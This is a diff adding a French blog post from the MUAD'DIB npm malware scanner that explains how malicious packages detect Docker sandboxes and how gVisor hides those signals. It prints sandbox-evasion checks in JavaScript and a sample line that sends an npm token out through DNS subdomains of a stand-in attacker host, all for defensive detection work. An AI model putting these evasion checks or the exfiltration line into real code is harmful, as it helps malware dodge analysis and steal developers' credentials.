@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>gVisor : le kernel qui rend la sandbox invisible - MUAD'DIB</title>
+  <meta name="description" content="Comment gVisor intercepte les syscalls au niveau kernel pour que les malwares ne détectent plus la sandbox.">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="gVisor : le kernel qui rend la sandbox invisible">
+  <meta property="og:description" content="Comment gVisor intercepte les syscalls au niveau kernel pour que les malwares ne détectent plus la sandbox.">
+  <meta property="og:image" content="../img/og-default.png">
+  <meta property="og:site_name" content="MUAD'DIB">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="../img/og-default.png">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../vendor/github-dark.min.css">
+  <script src="../vendor/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<nav>
+  <a href="../" class="site-name">muad-dib</a>
+  <a href="../">accueil</a>
+  <a href="./">blog</a>
+  <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">github</a>
+  <a href="https://www.npmjs.com/package/muaddib-scanner" target="_blank" rel="noopener">npm</a>
+</nav>
+
+<main>
+  <a href="./" class="back-link">&larr; Blog</a>
+
+  <article>
+    <div class="article-meta">
+      <h1>gVisor : le kernel qui rend la sandbox invisible</h1>
+      <span class="date">2026-03-31</span>
+      <div class="tags">
+        <span class="tag">sandbox</span>
+        <span class="tag">gvisor</span>
+        <span class="tag">évasion</span>
+        <span class="tag">détection</span>
+      </div>
+    </div>
+
+    <div class="article-content">
+
+      <p>Les malwares npm détectent Docker. Tous. En 2026, c'est la première chose qu'ils font avant d'exécuter le payload.</p>
+
+      <p>Trois techniques, toutes triviales :</p>
+
+      <pre><code class="language-javascript">// 1. Le fichier sentinelle
+if (fs.existsSync('/.dockerenv')) process.exit(0);
+
+// 2. Les cgroups
+const cgroup = fs.readFileSync('/proc/1/cgroup', 'utf8');
+if (cgroup.includes('docker') || cgroup.includes('kubepods'))
+  process.exit(0);
+
+// 3. Le traceur (strace, ptrace)
+const status = fs.readFileSync('/proc/self/status', 'utf8');
+const tracerPid = status.match(/TracerPid:\s+(\d+)/);
+if (tracerPid && tracerPid[1] !== '0') process.exit(0);</code></pre>
+
+      <p>Si l'un de ces checks passe, le malware sort proprement. Le sandbox conclut : package clean. Le payload ne s'est jamais exécuté.</p>
+
+      <p>MUAD'DIB utilisait Docker avec <code>strace</code> pour capturer les syscalls. Ça marchait. Mais <code>strace</code> est visible via <code>/proc/self/status</code> (<code>TracerPid != 0</code>). Et <code>/.dockerenv</code> existait toujours dans le container.</p>
+
+      <h2>La solution : gVisor</h2>
+
+      <p><a href="https://gvisor.dev" target="_blank" rel="noopener">gVisor</a> est un runtime container open source développé par Google. Au lieu de partager le noyau Linux de l'hôte comme Docker, gVisor intercepte chaque syscall dans un noyau utilisateur écrit en Go.</p>
+
+      <p>Concrètement :</p>
+
+      <ul>
+        <li><code>/.dockerenv</code> n'existe pas. Le filesystem est géré par gVisor.</li>
+        <li><code>/proc/1/cgroup</code> ne contient pas "docker". gVisor simule son propre <code>/proc</code>.</li>
+        <li><code>TracerPid</code> est toujours 0. gVisor capture les syscalls au niveau kernel, pas via ptrace.</li>
+      </ul>
+
+      <p>Le malware voit un Linux normal. Il exécute le payload. La sandbox capture tout.</p>
+
+      <h2>--strace natif</h2>
+
+      <p>C'est le détail qui change tout. gVisor a un mode <code>--strace</code> intégré. Chaque syscall est logué directement par le runtime.</p>
+
+      <pre><code class="language-bash"># Docker standard : strace externe (visible via TracerPid)
+docker run --security-opt seccomp=unconfined strace -f -e trace=all node install.js
+
+# gVisor : strace natif (invisible pour le processus)
+docker run --runtime=runsc \
+  -e GVISOR_STRACE=true \
+  node install.js</code></pre>
+
+      <p>Pas de <code>strace</code> Linux. Pas de <code>ptrace</code>. Pas de Tracee, pas d'Aqua Security, pas d'outil tiers. Un binaire Google de 50 Mo qui s'installe en 30 secondes.</p>
+
+      <pre><code class="language-bash"># Installation
+curl -fsSL https://gvisor.dev/archive.key | sudo gpg --dearmor -o /usr/share/keyrings/gvisor-archive-keyring.gpg
+sudo apt install runsc
+sudo runsc install
+sudo systemctl reload docker</code></pre>
+
+      <h2>--log-packets pour le réseau</h2>
+
+      <p>gVisor intercepte aussi le trafic réseau au niveau kernel. Le flag <code>--log-packets</code> enregistre chaque paquet TCP/UDP sans que le processus puisse le détecter.</p>
+
+      <p>Combiné avec la network blacklist (28 domaines safe, 24 domaines exfil connus, 7 patterns OAST), ça donne une visibilité complète sur les communications réseau du package. Le malware ne peut ni détecter le monitoring, ni exfiltrer vers un domaine blacklisté sans déclencher une alerte CRITICAL.</p>
+
+      <h2>Honey tokens DNS</h2>
+
+      <p>En v2.10.41, MUAD'DIB détecte aussi l'encodage dans les sous-domaines DNS. Les malwares exfiltrent des credentials en les encodant dans des requêtes DNS :</p>
+
+      <pre><code class="language-javascript">// Le malware encode le token dans le sous-domaine
+const encoded = Buffer.from(npmToken).toString('hex');
+dns.resolve(`${encoded}.evil-c2.com`);</code></pre>
+
+      <p>Le honey token DNS injecté dans le sandbox est un marqueur connu. Si ce marqueur apparaît en hex, base64, ou base64url dans un sous-domaine DNS, c'est une exfiltration confirmée. CRITICAL, zéro faux positif.</p>
+
+      <h2>En production</h2>
+
+      <p>gVisor est gardé derrière <code>MUADDIB_SANDBOX_RUNTIME=gvisor</code>. Si <code>runsc</code> n'est pas installé, le monitor utilise Docker standard. Pas de régression, pas de dépendance dure.</p>
+
+      <p>Le parser gVisor (<code>gvisor-parser.js</code>) transforme les logs strace et network en findings exploitables par le pipeline de scoring existant. Mêmes types, mêmes sévérités, même webhook.</p>
+
+      <p>Résultat : les 19 types de menaces high-confidence, les canary tokens, la network blacklist, et le honey token DNS fonctionnent tous dans un environnement que le malware ne peut pas distinguer d'une machine de développeur.</p>
+
+      <h2>Le bilan</h2>
+
+      <table>
+        <thead>
+          <tr><th>Évasion</th><th>Docker standard</th><th>gVisor</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>/.dockerenv</code></td><td>Détectable</td><td>Invisible</td></tr>
+          <tr><td><code>/proc/1/cgroup</code></td><td>Détectable</td><td>Invisible</td></tr>
+          <tr><td><code>TracerPid</code></td><td>Détectable (strace)</td><td>Invisible (natif)</td></tr>
+          <tr><td>Outils externes</td><td>strace, Tracee</td><td>Aucun</td></tr>
+          <tr><td>Installation</td><td>Docker</td><td>Docker + runsc (30s)</td></tr>
+        </tbody>
+      </table>
+
+      <p>Un binaire. Pas de config. Pas de dépendance. Le malware pense qu'il s'exécute sur une vraie machine. Il exécute le payload. On capture tout.</p>
+
+    </div>
+  </article>
+</main>
+
+<footer>
+  MUAD'DIB / DNSZLSK / <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">source</a>
+</footer>
+
+</body>
+</html>
